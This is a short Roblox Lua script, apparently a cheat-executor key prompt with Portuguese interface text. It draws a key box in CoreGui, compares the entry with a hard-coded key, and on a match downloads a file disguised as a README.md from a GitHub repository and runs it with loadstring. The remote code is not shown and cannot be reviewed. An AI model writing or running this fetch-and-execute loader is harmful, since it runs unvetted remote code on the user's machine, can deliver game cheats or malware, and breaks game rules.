local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.CoreGui

local textBox = Instance.new("TextBox")
textBox.Parent = screenGui
textBox.Position = UDim2.new(0.5, -75, 0.5, -25)
textBox.Size = UDim2.new(0, 150, 0, 50)
textBox.PlaceholderText = "Digite a chave"

local confirmButton = Instance.new("TextButton")
confirmButton.Parent = screenGui
confirmButton.Position = UDim2.new(0.5, 20, 0.5, -25)
confirmButton.Size = UDim2.new(0, 50, 0, 50)
confirmButton.Text = "confirmar"

local key = "chave23"

confirmButton.MouseButton1Click:Connect(function()
    if textBox.Text == key then
        screenGui:Destroy() 
        print("Acesso concedido!")
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/Noname929798/Qthbvcgb/refs/heads/main/README.md'),true))()
    else
        print("Chave incorreta.")
    end
end)
local player = game.Players.LocalPlayer
